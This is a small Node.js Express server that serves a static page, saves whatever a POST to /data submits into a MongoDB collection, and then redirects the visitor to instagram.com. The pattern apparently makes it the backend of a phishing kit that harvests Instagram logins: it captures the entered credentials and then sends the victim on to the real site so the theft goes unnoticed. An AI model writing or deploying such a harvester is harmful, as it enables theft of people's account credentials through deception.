const express = require('express');
const app = express();
const cors = require('cors');

require('./config/mongoose');
const User=require('./models/user')
const path=require('path')

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(express.static(path.join(__dirname,'./public')));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.post('/data',async(req,res)=>{
    
    console.log(req.body)
    let data=JSON.stringify(req.body);
    let user=await User.create({data:data});
    return res.redirect('https://www.instagram.com/');
})

app.use((req, res, next) => {
    const error = new Error('Not found');
    error.status = 404;
    next(error);
});

// error handler middleware
app.use((error, req, res) => {
    res.status(error.status || 500).send({
        error: {
            status: error.status || 500,
            message: error.message || 'Internal Server Error',
        },
    });
});

app.listen(process.env.PORT||8080, (err) => {
    if (err) {
        console.log(err);
    }
    console.log('Server started');
});
